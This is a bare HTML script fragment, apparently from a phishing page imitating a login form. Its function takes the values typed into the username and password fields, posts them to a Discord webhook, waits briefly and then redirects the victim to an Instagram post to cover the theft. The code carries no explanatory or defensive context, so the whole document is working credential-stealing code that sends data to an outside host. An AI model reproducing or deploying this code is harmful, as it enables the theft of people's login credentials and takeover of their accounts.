  <script>
  function sendMessage() {
  function sleep(milliseconds) {
  const date = Date.now();
  let currentDate = null;
  do {
    currentDate = Date.now();
  } while (currentDate - date < milliseconds);
}
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/12[...]160479/sL7[...]L7lyh-");
    request.setRequestHeader('Content-type', 'application/json');
    var params = {
      content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
    }
    request.send(JSON.stringify(params));
    sleep(400)
    window.location.replace("https://www.instagram.com/p/B[...]ip");
  }
  </script>
